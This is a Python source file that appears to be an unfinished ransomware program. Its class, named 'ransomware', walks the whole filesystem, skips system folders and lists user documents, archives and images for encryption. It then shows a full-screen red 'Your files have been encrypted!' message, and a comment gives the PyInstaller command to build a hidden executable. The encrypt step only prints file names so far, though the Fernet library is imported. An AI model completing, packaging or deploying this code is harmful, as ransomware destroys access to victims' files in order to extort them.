import os
import random
import threading
import queue
import socket
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import *

#python -m PyInstaller --onefile -w encrypt.py
digits = random.randint(1111,9999) 
class ransomware:
    EXCLUDED_DIRECTORIES = ('Program Files',
                            'Program Files (x86)',
                            'Windows',
                            '$Recycle.Bin',
                            'AppData',
                            'logs',
            )
    
    EXTENSIONS = (
            '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
            '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
            '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
            '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
    )
    
    def find_files(self):
        abs_files = []
        for root, dirs, files in os.walk("/"):
            if any(s in root for s in self.EXCLUDED_DIRECTORIES):
                pass
            else:
                for file in files:
                    if file.endswith(self.EXTENSIONS):
                        TARGET = os.path.join(root, file)
                        abs_files.append(TARGET)
                        
        #for file in (abs_files):
        #    print(file)
        return abs_files
    
    def encrypt(self, filename):
        for file in filename:
            print(file)

def display_message():
    root = tk.Tk()
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    root.geometry(f"{screen_width}x{screen_height}")
    root.configure(background="black")
    labe1 = tk.Label(root, text="Your files have been encrypted!", font=("Tahoma", 24), background='black', highlightbackground="black", highlightcolor="red", foreground="red", justify="center")
    labe1.pack()



    root.mainloop()
    
ransomware = ransomware()
encrypt_files = ransomware.find_files()
ransomware.encrypt(encrypt_files)
display_message()
